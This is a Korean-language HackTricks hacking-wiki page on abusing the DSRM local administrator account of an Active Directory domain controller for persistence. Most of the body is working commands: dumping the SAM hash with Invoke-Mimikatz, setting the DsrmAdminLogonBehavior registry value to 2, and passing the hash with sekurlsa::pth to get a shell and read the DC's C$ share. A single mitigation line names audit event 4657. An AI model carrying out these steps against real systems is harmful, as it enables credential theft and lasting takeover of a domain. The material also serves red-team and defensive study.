<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* 회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 자신의 해킹 기법을 공유하세요.

</details>


# DSRM 자격 증명

각 **DC**에는 **로컬 관리자** 계정이 있습니다. 이 컴퓨터에서 관리자 권한을 가지고 있다면 mimikatz를 사용하여 **로컬 관리자 해시를 덤프**할 수 있습니다. 그런 다음 레지스트리를 수정하여 이 패스워드를 **활성화**하여 원격으로 이 로컬 관리자 사용자에 액세스할 수 있습니다.\
먼저 DC 내부의 **로컬 관리자** 사용자의 **해시**를 **덤프**해야 합니다:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
그런 다음 해당 계정이 작동하는지 확인해야 하며, 레지스트리 키의 값이 "0"인지 또는 존재하지 않는지 확인해야 합니다. 그렇지 않으면 **"2"로 설정**해야 합니다:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
그런 다음 PTH를 사용하여 C$의 내용을 나열하거나 쉘을 얻을 수 있습니다. PTH를 사용하여 메모리에 해당 해시로 새로운 PowerShell 세션을 만들 때 "도메인"은 DC 머신의 이름만 사용됩니다.
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
더 많은 정보는 다음에서 확인할 수 있습니다: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) 및 [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## 완화 방법

* 이벤트 ID 4657 - `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`의 생성/변경 감사

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
